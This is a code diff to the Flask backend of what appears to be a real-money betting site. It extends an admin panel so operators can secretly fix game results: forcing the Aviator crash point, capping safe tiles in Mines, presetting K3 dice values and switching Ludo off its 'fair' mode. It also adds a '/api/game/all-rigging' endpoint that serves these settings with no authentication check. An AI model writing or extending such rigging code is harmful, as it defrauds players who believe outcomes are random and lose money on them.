@@ -598,6 +598,9 @@ def api_admin_overview():
         man_row = cursor.fetchone()
         manual_num = man_row['value'] if man_row else ''
 
+        cursor.execute('SELECT key, value FROM settings')
+        all_sets = {r['key']: r['value'] for r in cursor.fetchall()}
+
         # Wagers on current period
         cursor.execute('SELECT select_val, SUM(amount) as amt FROM bets WHERE period = ? GROUP BY select_val', (period,))
         wager_rows = cursor.fetchall()
@@ -608,8 +611,15 @@ def api_admin_overview():
         'currentPeriod': period,
         'remainingSeconds': remaining,
         'isLocked': is_locked,
-        'gameMode': game_mode,
-        'manualNumber': manual_num,
+        'gameMode': all_sets.get('game_mode', 'random'),
+        'manualNumber': all_sets.get('manual_number', ''),
+        'aviatorMode': all_sets.get('aviator_mode', 'random'),
+        'aviatorCrash': all_sets.get('aviator_crash', '2.00'),
+        'minesMode': all_sets.get('mines_mode', 'random'),
+        'minesMaxSafe': all_sets.get('mines_max_safe', '1'),
+        'k3Mode': all_sets.get('k3_mode', 'random'),
+        'k3Dice': all_sets.get('k3_dice', '1,2,3'),
+        'ludoMode': all_sets.get('ludo_mode', 'fair'),
         'stats': {
             'users': users_count,
             'totalBalance': total_balance,
@@ -619,6 +629,24 @@ def api_admin_overview():
         'wagers': wagers
     })
 
+@app.route('/api/game/all-rigging', methods=['GET'])
+def api_game_all_rigging():
+    with get_db() as conn:
+        cursor = conn.cursor()
+        cursor.execute('SELECT key, value FROM settings')
+        s = {r['key']: r['value'] for r in cursor.fetchall()}
+    return jsonify({
+        'success': True,
+        'aviator_mode': s.get('aviator_mode', 'random'),
+        'aviator_crash': float(s.get('aviator_crash', '2.00') or 2.00),
+        'aviator_force_ts': int(s.get('aviator_force_ts', '0') or 0),
+        'mines_mode': s.get('mines_mode', 'random'),
+        'mines_max_safe': int(s.get('mines_max_safe', '1') or 1),
+        'k3_mode': s.get('k3_mode', 'random'),
+        'k3_dice': s.get('k3_dice', '1,2,3'),
+        'ludo_mode': s.get('ludo_mode', 'fair')
+    })
+
 @app.route('/api/admin/control', methods=['POST'])
 def api_admin_control():
     ok, _ = verify_admin(request)
@@ -626,18 +654,27 @@ def api_admin_control():
         return jsonify({'success': False, 'message': 'Unauthorized'}), 403
 
     data = request.get_json(silent=True) or {}
-    mode = data.get('mode')
-    manual_num = data.get('manual_number', '')
+    mapping = {
+        'mode': 'game_mode',
+        'manual_number': 'manual_number',
+        'aviator_mode': 'aviator_mode',
+        'aviator_crash': 'aviator_crash',
+        'aviator_force_ts': 'aviator_force_ts',
+        'mines_mode': 'mines_mode',
+        'mines_max_safe': 'mines_max_safe',
+        'k3_mode': 'k3_mode',
+        'k3_dice': 'k3_dice',
+        'ludo_mode': 'ludo_mode'
+    }
 
     with get_db() as conn:
         cursor = conn.cursor()
-        if mode:
-            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('game_mode', mode))
-        if manual_num is not None:
-            cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', ('manual_number', str(manual_num)))
+        for body_key, db_key in mapping.items():
+            if body_key in data and data[body_key] is not None:
+                cursor.execute('INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)', (db_key, str(data[body_key])))
         conn.commit()
 
-    return jsonify({'success': True, 'message': 'Admin game settings updated!'})
+    return jsonify({'success': True, 'message': 'All Game Controls updated successfully!'})
 
 @app.route('/api/admin/users', methods=['GET'])
 def api_admin_users():
